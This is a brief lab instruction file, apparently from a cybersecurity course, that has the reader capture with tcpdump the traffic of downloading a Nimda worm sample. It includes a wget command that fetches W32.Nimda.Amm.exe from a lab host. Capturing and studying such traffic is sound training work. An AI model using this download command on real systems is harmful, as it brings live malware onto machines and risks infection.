# 05 — Packet Capture

## Start tcpdump

On H5:

```bash
tcpdump -i H5-eth0 -w nimda.download.pcap &
```

Press ENTER to regain control.

## Repeat Traffic

```bash
wget 209.165.202.133:6666/W32.Nimda.Amm.exe
```

## Stop Capture

```bash
fg
```

Then press:

```text
Ctrl+C
```

## Verify

```bash
ls -l
```

Confirm that:

```text
nimda.download.pcap
```

exists and has a size greater than zero.

## Evidence

Save screenshots under:

```text
screenshots/03-traffic-capture/
```

The repository ignores PCAP files by default to avoid accidentally publishing large or sensitive packet captures.
